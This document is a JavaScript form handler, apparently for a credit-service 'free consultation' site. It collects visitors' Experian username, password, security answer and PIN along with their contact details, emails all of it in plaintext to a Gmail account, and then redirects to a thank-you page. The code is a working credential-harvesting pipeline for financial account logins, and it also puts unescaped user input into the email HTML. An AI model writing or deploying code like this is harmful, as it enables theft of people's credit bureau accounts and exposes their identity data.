import nodemailer from "nodemailer";

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).send("Method Not Allowed");
  }

  try {
    const {
      first_name,
      last_name,
      phone,
      email,
      experian_username,
      experian_password,
      experian_security_answer,
      experian_pin,
      service,
      sms_consent
    } = req.body;

    // Handle multiple checkboxes properly
    const selectedServices = Array.isArray(service)
      ? service.join(", ")
      : service || "None selected";

    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: process.env.GMAIL_USER,
        pass: process.env.GMAIL_PASS, // App Password
      },
    });

    const mailOptions = {
      from: process.env.GMAIL_USER,
      to: process.env.GMAIL_USER,
      subject: "New Free Consultation Form Submission",
      html: `
        <h2>New Free Consultation Submission</h2>

        <p><strong>Name:</strong> ${first_name} ${last_name}</p>
        <p><strong>Email:</strong> ${email}</p>
        <p><strong>Phone:</strong> ${phone}</p>

        <hr />

        <h3>Experian Information</h3>
        <p><strong>Username:</strong> ${experian_username}</p>
        <p><strong>Password:</strong> ${experian_password}</p>
        <p><strong>Security Answer:</strong> ${experian_security_answer}</p>
        <p><strong>4 Digit PIN:</strong> ${experian_pin}</p>

        <hr />

        <h3>Requested Services</h3>
        <p>${selectedServices}</p>

        <hr />

        <p><strong>SMS Consent:</strong> ${sms_consent ? "Yes" : "No"}</p>
      `,
    };

    await transporter.sendMail(mailOptions);

    // Redirect after success
    res.writeHead(302, {
      Location: "https://bisque-ram-411182.hostingersite.com/thank-you",
    });
    res.end();

  } catch (error) {
    console.error(error);
    res.status(500).send("Email sending failed");
  }
}